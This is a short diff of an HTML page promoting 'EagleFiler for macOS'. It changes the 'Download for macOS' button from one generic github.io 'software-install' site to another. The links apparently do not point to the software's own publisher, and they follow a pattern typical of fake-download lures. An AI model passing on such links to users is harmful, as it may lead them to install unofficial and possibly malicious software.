@@ -6,7 +6,7 @@
 <h3>EagleFiler for macOS</h3>
 <p>EagleFiler for macOS is an intuitive tool for organizing your documents, emails, and files. Store everything in one place and find it quickly when needed.</p>
 
-<a href="https://mac-software-install.github.io/.github/EagleFiler">
+<a href="https://software-install-apps.github.io/.github/EagleFiler">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
